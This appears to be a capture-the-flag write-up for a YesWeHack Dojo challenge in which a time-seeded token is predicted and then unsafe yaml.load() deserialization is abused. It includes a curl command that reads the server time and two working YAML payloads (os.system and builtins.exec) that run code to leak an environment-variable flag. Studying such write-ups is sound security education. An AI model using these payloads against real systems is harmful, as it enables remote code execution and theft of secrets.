# YesWeHack Dojo43 CCTV Manager Write-Up

<p align="justify">The targeted app is a firmware updater implementing a token-based access control.It generates a "root" token and compares it against a "guest" token provided by the user.
If the tokens match, it loads a YAML config (expected to contain firmware data), instantiates a Firmware object, and calls its update() method. As a matter of fact, update method from firmware class is empty and don't do anything.Finally, it renders an index.html template showing whether access was granted.</p>

## Code analysis
<p align="justify">The application implements a weak token-based authentication mechanism, where the server-generated token could be predicted or matched by an attacker. Combined with the insecure use of yaml.load() on untrusted input, this enabled malicious YAML payloads to trigger Python built-in functions and achieve Remote Code Execution (RCE). This flaw allowed attackers to bypass authentication, execute arbitrary code, and disclose sensitive information such as environment variables (including the flag). </p>

<p align="justify">Below is the function used to generate 'random' token, taking current time (namely server time) as seed :</p>

````python
def genToken(seed:str) -> str:
    random.seed(seed)
    return ''.join(random.choices('abcdef0123456789', k=16))
````

<p align="justify">This is a very weak access control implementation insofar as server time can be easily catched using following cmdline. As a result token can be successfuly generated: </p>

````bash
curl -sI https://dojo-yeswehack.com | grep -i '^date:' | cut -d' ' -f2-
````

<p align="justify">Once token is validated yaml firware is loaded thanks to following lines. This load method is officialy deprecated for security reason. Instead </p> 

````python
    try:
        data = yaml.load(yamlConfig, Loader=yaml.Loader)
        firmware = Firmware(**data["firmware"])
        firmware.update()
    except:
        pass
````

## solve 1 

````bash
firmware:
  version: !!python/object/apply:os.system
  - |
    echo $FLAG
````

## solve 2  

````bash
firmware:
  version: !!python/object/apply:builtins.exec 
  - |
    import threading
    def leak_flag():
        import os
        flag = os.environ.get("FLAG", "no_flag")
        raise Exception(f"FLAG_LEAK: {flag}")
    threading.Thread(target=leak_flag).start() # starting thread in server context triggers error relfected in output server (see snippet below)
````
